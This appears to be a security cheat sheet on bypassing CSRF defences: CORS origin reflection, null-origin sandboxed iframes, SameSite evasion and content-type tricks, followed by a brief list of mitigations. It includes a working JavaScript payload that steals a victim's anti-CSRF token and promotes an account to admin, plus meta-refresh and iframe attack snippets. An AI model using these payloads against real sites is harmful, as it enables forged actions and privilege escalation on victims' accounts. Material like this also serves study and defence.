# CSRF — CORS Abuse, Token Bypass & SameSite Evasion

CSRF in modern apps is rarely "no token at all" — it's defeating the *defences*. These are
the recurring bypasses.

## CORS misconfiguration → CSRF token theft

If the app reflects the request `Origin` into `Access-Control-Allow-Origin` **and** sets
`Access-Control-Allow-Credentials: true`, any attacker origin can read authenticated
responses — including pages that embed the anti-CSRF token. Steal the token cross-origin,
then submit a forged state-changing request with it:

```js
// Runs on attacker.htb, victim is logged into TARGET
var x = new XMLHttpRequest();
x.open('GET', 'https://TARGET/profile', true);
x.withCredentials = true;          // sends victim's cookies
x.onload = function () {
  var token = /csrf"\s*value="([^"]+)"/.exec(x.responseText)[1];
  var p = new XMLHttpRequest();
  p.open('POST', 'https://TARGET/promote', true);
  p.withCredentials = true;
  p.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  p.send('csrf=' + token + '&role=admin');
};
x.send();
```

The reflected-origin + credentials combo is the bug; the token "protection" becomes
readable and therefore useless.

## Null-origin sandboxed-iframe bypass

When the server *allow-lists* `Origin: null` (a common mistake meant to permit
file:///redirects), serve the attack from a **sandboxed iframe**, which the browser tags
with `Origin: null`:

```html
<iframe sandbox="allow-scripts allow-forms"
        srcdoc="<script>/* CORS/CSRF request with Origin: null */</script>"></iframe>
```

## SameSite=Strict / Lax evasion

`SameSite=Strict` blocks the cookie on cross-site requests — but a **top-level navigation
the user is redirected into** is treated as same-site once it lands. Chain an open redirect
or a `<meta http-equiv="refresh">` so the final state-changing GET originates "from" the
target:

```html
<!-- victim lands here from attacker page; refresh fires same-site -->
<meta http-equiv="refresh" content="0; url=https://TARGET/admin?promote=2">
```

`SameSite=Lax` still allows cookies on top-level **GET** navigations, so any
state-changing action exposed over GET remains CSRF-able under Lax.

## Method / content-type tricks

- State change exposed over **GET** → trivial CSRF via `<img>`/navigation, no token flow.
- JSON endpoints that don't verify `Content-Type` → submit via an HTML form with
  `enctype="text/plain"` and pack the JSON into a single field name.

## Mitigations

Per-request CSRF tokens tied to the session; `SameSite=Lax`/`Strict` *and* a token (belt
and suspenders); strict CORS (no reflected `Origin`, no `null` allow-list with
credentials); never expose state changes over GET; verify `Content-Type` on JSON APIs.
